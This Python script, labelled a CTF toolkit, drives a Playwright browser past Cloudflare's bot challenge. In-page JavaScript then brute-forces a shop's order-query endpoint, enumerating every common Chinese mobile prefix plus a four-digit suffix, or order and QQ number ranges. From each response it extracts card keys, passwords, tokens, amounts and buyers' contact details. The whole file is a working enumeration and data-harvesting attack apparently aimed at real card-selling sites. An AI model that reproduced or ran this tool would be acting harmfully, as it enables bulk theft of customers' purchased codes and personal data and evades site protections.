"""
CTF Toolkit: Playwright Scanner — CF-safe brute-force
======================================================
通过 Playwright 浏览器上下文发送所有请求，天然绕过 Cloudflare。
支持: 订单号爆破 + 联系方式爆破 + 任意自定义端点。

用法:
    # 手机号爆破
    python playwright_scanner.py --url https://target --type phone \\
        --prefix 1879649 --suffix-range 0000-9999 --workers 50

    # 订单号爆破
    python playwright_scanner.py --url https://target --type order \\
        --range 1-5000 --workers 100

    # QQ号爆破
    python playwright_scanner.py --url https://target --type qq \\
        --range 10000-99999 --workers 50

    # 自定义端点
    python playwright_scanner.py --url https://target --endpoint /user/api/index/query \\
        --param "keywords={kw}&page=1&limit=100" --range 13800000000-13800001000

依赖: pip install playwright && playwright install chromium
"""
import argparse
import asyncio
import json
import re
import sys
import time
from pathlib import Path

# ============================================================
# Secret extraction (mirrors Go version)
# ============================================================
SECRET_FIELDS = [
    "secret", "card_info", "card_key", "security_key", "trade_no",
    "tradeNo", "order_id", "orderId", "password", "token",
    "key", "code", "account", "email", "link", "url",
    "content", "data", "info", "contact", "amount", "price",
    "goods", "product", "name", "card", "value",
]
FLAG_RE = re.compile(r'(?i)(flag|ctf|dasctf)\{[^}]+\}')


def extract_secrets(body: str) -> dict:
    found = {}
    for field in SECRET_FIELDS:
        pat = re.compile(rf'"{field}"\s*:\s*"([^"]*)"')
        matches = pat.findall(body)
        if matches:
            uniq = list(set(m for m in matches if m and len(m) < 5000))[:20]
            if uniq:
                found[field] = uniq
    flags = FLAG_RE.findall(body)
    if flags:
        found["FLAG"] = flags
    return found


# ============================================================
# JS scanner injected into Playwright page
# ============================================================

SCANNER_JS = """
async (config) => {
    const {keywords, endpoint, method, paramTemplate, contentType} = config;
    const results = [];
    let done = 0;
    const total = keywords.length;

    // Process in batches with concurrency
    const CONCURRENT = config.workers || 50;

    async function probe(kw) {
        let url = endpoint;
        let body = paramTemplate.replace(/{kw}/g, encodeURIComponent(kw));

        const headers = {'Content-Type': contentType || 'application/x-www-form-urlencoded'};

        let resp;
        if (method === 'GET') {
            url += (url.includes('?') ? '&' : '?') + body;
            resp = await fetch(url, {headers});
        } else {
            resp = await fetch(url, {method: 'POST', headers, body});
        }

        const text = await resp.text();
        done++;

        // Check if response contains order data
        if (text.length < 50) return null;
        if (text.includes('登录') || text.includes('login') ||
            text.includes('404') || text.includes('会话过期')) return null;

        // Must look like order data
        const hasList = text.includes('"list"') && text.includes('"total"');
        const hasTrade = text.includes('trade') || text.includes('order') ||
                         text.includes('card') || text.includes('secret');
        if (!hasList && !hasTrade) return null;

        // Parse JSON and check for actual data
        try {
            const data = JSON.parse(text);
            const total = data?.data?.total || data?.total || 0;
            if (total === 0 && !hasTrade) return null;
        } catch(e) {}

        return {keyword: kw, len: text.length, body: text};
    }

    // Concurrent batch processing
    for (let i = 0; i < keywords.length; i += CONCURRENT) {
        const batch = keywords.slice(i, i + CONCURRENT);
        const promises = batch.map(kw => probe(kw));
        const batchResults = await Promise.all(promises);

        for (const r of batchResults) {
            if (r) results.push(r);
        }

        // Progress report
        const pct = Math.round(i * 100 / total);
        if (i % (CONCURRENT * 5) === 0 || i + CONCURRENT >= keywords.length) {
            console.log(`PROGRESS:${i+CONCURRENT}/${total}:${results.length}`);
        }

        // Small delay between batches to avoid rate limiting
        if (i + CONCURRENT < keywords.length) {
            await new Promise(r => setTimeout(r, 50));
        }
    }

    return results;
}
"""


# ============================================================
# Playwright Scanner
# ============================================================
class PlaywrightScanner:
    def __init__(self, headless: bool = False, timeout: int = 30000):
        self.headless = headless
        self.timeout = timeout
        self.browser = None
        self.page = None

    def start(self):
        from playwright.sync_api import sync_playwright
        self._pw = sync_playwright().start()
        self.browser = self._pw.chromium.launch(headless=self.headless)
        self.page = self.browser.new_page()
        self.page.set_default_timeout(self.timeout)

    def bypass_cf(self, url: str, wait_sec: int = 10) -> bool:
        """Navigate and wait for CF challenge"""
        print(f"[*] Loading {url}...")
        self.page.goto(url, wait_until="domcontentloaded", timeout=30000)

        start = time.time()
        while time.time() - start < wait_sec:
            title = self.page.title()
            if not any(kw in title.lower() for kw in
                      ["just a moment", "请稍候", "attention required"]):
                print(f"[+] Page loaded: {title}")
                return True
            time.sleep(1)
        print(f"[!] CF may still be active after {wait_sec}s")
        return False

    def scan(self, keywords: list[str], endpoint: str = "/user/api/index/query",
             method: str = "POST", param_template: str = "keywords={kw}&page=1&limit=100",
             workers: int = 50) -> list[dict]:
        """
        Run bulk scan through Playwright JS context.
        Returns list of hits {keyword, len, body}.
        """
        config = {
            "keywords": keywords,
            "endpoint": endpoint,
            "method": method,
            "paramTemplate": param_template,
            "contentType": "application/x-www-form-urlencoded",
            "workers": workers,
        }

        print(f"[*] Scanning {len(keywords)} keywords × {workers} concurrent...")
        raw_results = self.page.evaluate(SCANNER_JS, config)

        # Parse and extract secrets from raw results
        findings = []
        for r in raw_results:
            secrets = extract_secrets(r["body"])
            if secrets:
                findings.append({
                    "keyword": r["keyword"],
                    "len": r["len"],
                    "secrets": secrets,
                })

        return findings

    def close(self):
        if self.browser:
            self.browser.close()
        if hasattr(self, '_pw'):
            self._pw.stop()


# ============================================================
# Keyword Generators
# ============================================================
def generate_phone_keywords(prefixes: list[str], suffix_start: int,
                            suffix_end: int) -> list[str]:
    """Generate phone numbers: prefix + 4-digit suffix"""
    keywords = []
    for pfx in prefixes:
        for sfx in range(suffix_start, suffix_end + 1):
            keywords.append(f"{pfx}{sfx:04d}")
    return keywords


def generate_order_keywords(start: int, end: int) -> list[str]:
    """Generate order/trade number range"""
    return [str(i) for i in range(start, end + 1)]


def parse_range(s: str) -> tuple:
    """Parse '1-5000' or '1,5000'"""
    s = s.replace(',', '-')
    parts = s.split('-')
    return int(parts[0]), int(parts[1])


# ============================================================
# Output
# ============================================================
def print_hit(hit):
    secrets = hit["secrets"]
    keyword = hit["keyword"]

    trade_no = ""
    for k in ["trade_no", "tradeNo", "order_id"]:
        if k in secrets and secrets[k]:
            trade_no = secrets[k][0]
            break

    goods = ""
    for k in ["name", "product", "goods"]:
        if k in secrets and secrets[k]:
            goods = secrets[k][0]
            break

    amount = ""
    for k in ["amount", "price"]:
        if k in secrets and secrets[k]:
            amount = secrets[k][0]
            break

    card = ""
    for k in ["secret", "card_info", "card_key", "card"]:
        if k in secrets and secrets[k]:
            card = secrets[k][0]
            break

    contact = ""
    if "contact" in secrets and secrets["contact"]:
        contact = secrets["contact"][0]

    # Count items if batch response
    total_items = max(
        hit.get("len", 0) // 500 - 1,
        hit["body"] if isinstance(hit.get("body"), str) else "".count('"tradeNo"')
    )

    print(f"\n[{keyword}] {trade_no} | {goods[:40]} | ¥{amount}")
    if contact:
        print(f"    联系: {contact}")
    if card:
        print(f"    卡密: {card[:120]}")
    if "FLAG" in secrets:
        for fl in secrets["FLAG"]:
            print(f"    🏴 {fl}")


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Playwright CF-safe Scanner")
    parser.add_argument("--url", required=True, help="目标URL (先打开此页过CF)")
    parser.add_argument("--type", choices=["phone", "order", "qq"],
                       default="phone", help="爆破类型")
    parser.add_argument("--prefix", default="",
                       help="手机号前缀 (逗号分隔, 如 138,150)")
    parser.add_argument("--suffix-range", default="0-9999",
                       help="后缀范围 (如 0-9999)")
    parser.add_argument("--range", default="",
                       help="数字范围 (如 1-5000 或 10000-99999)")
    parser.add_argument("--endpoint", default="/user/api/index/query",
                       help="API端点 (默认 /user/api/index/query)")
    parser.add_argument("--method", default="POST", help="HTTP方法")
    parser.add_argument("--param", default="keywords={kw}&page=1&limit=100",
                       help="参数模板 ({kw}替换为实际值)")
    parser.add_argument("--workers", type=int, default=50,
                       help="并发数 (默认50, 浏览器内限制)")
    parser.add_argument("--headless", action="store_true", help="无头模式")
    parser.add_argument("--output", "-o", help="JSON输出文件")
    args = parser.parse_args()

    # Generate keywords
    if args.type == "phone":
        if not args.prefix:
            args.prefix = "130,131,132,133,134,135,136,137,138,139," \
                         "150,151,152,153,155,156,157,158,159," \
                         "166,170,171,172,173,174,175,176,177,178," \
                         "180,181,182,183,184,185,186,187,188,189," \
                         "191,198,199"
        prefixes = [p.strip() for p in args.prefix.split(",")]
        s_start, s_end = parse_range(args.suffix_range)
        keywords = generate_phone_keywords(prefixes, s_start, s_end)
    elif args.type in ("order", "qq"):
        r_start, r_end = parse_range(args.range)
        keywords = generate_order_keywords(r_start, r_end)
    else:
        keywords = generate_order_keywords(*parse_range(args.range))

    print(f"[*] Generated {len(keywords):,} keywords")

    # Scan
    scanner = PlaywrightScanner(headless=args.headless)
    try:
        scanner.start()
        scanner.bypass_cf(args.url)

        findings = scanner.scan(
            keywords=keywords,
            endpoint=args.endpoint,
            method=args.method,
            param_template=args.param,
            workers=args.workers,
        )

        print(f"\n{'='*60}")
        print(f"[+] HITS: {len(findings)}")
        print(f"{'='*60}")

        for hit in findings:
            print_hit(hit)

        if args.output:
            output = {
                "url": args.url,
                "type": args.type,
                "total_keywords": len(keywords),
                "hits": len(findings),
                "findings": [
                    {"keyword": f["keyword"], "secrets": f["secrets"]}
                    for f in findings
                ],
            }
            Path(args.output).write_text(json.dumps(output, ensure_ascii=False, indent=2))
            print(f"\n[+] JSON → {args.output}")

    finally:
        scanner.close()


if __name__ == "__main__":
    main()
